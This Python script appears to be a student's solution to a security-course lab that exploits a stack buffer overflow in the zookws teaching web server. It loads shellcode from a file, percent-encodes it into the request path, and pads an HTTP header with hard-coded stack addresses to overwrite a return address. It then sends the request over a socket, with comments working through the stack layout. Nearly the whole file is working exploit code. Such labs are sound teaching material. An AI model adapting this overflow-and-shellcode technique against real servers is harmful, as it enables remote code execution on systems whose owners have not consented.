#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct
import os

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x7fffffffdce0
stack_retaddr = 0x7fffffffecf8
reqpath_shellcode = 0x7fffffffdce1

envvar_addr = 0x7fffffffd890
httpheader_rip = 0x7fffffffdcc8
## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##
    ##   urllib.parse.quote_from_bytesquote(s).encode('ascii')
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<Q", x)
    ##     returns the 8-byte binary encoding of the 64-bit integer x
    
    shellfile = open("shellcode.bin", "rb")
    s = shellfile.read()
    shellcode = urllib.parse.quote_from_bytes(s).encode('ascii')

    #shellcode += b"A" * ((stack_retaddr - stack_buffer) - len(shellcode))
    #binary_addr = struct.pack("<Q", stack_buffer)
    #encoded_addr = urllib.parse.quote_from_bytes(binary_addr).encode('ascii')
    #shellcode += encoded_addr
    reqpath = b"/" + shellcode
    print(reqpath)
    header_name = b"A"*((httpheader_rip - envvar_addr) - len("HTTP_")) 
    b_reqpath_shellcode = struct.pack("<Q", reqpath_shellcode)
    url_reqpath_shellcode = urllib.parse.quote_from_bytes(b_reqpath_shellcode).encode('ascii')
    header_name += b_reqpath_shellcode
    ## stack_retaddr - stack_buffer = 4096 + 24 
    ## length is actually +1 for the b"/"
    ## QUESTION: "/" (+1) in string is only reason why it works, meaning buffer overflows only by 1 to run_server's return address
    ## 0x7fffffffdce0 |         | reqpath[0-7]
    ## 0x7fffffffece0 | +4096   | reqpath[4088-4095]
    ## 0x7fffffffece8 | +8      | &errmsg [(const char **)]
    ## 0x7fffffffecf0 | +8      | run_server's %rbp
    ## 0x7fffffffecf8 | +8      | run_server's return address
    ## QUESTION: why is &errmsg pushed onto stack *before* reqpath?

    req =   b"GET " + reqpath + \
            b" HTTP/1.0 \n" + \
            header_name[:-2] + b": foo bar" + \
            b"\r\n\r\n"

   # req = b"GET / HTTP/1.0 \nCookie: foo bar\r\n" + b"\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

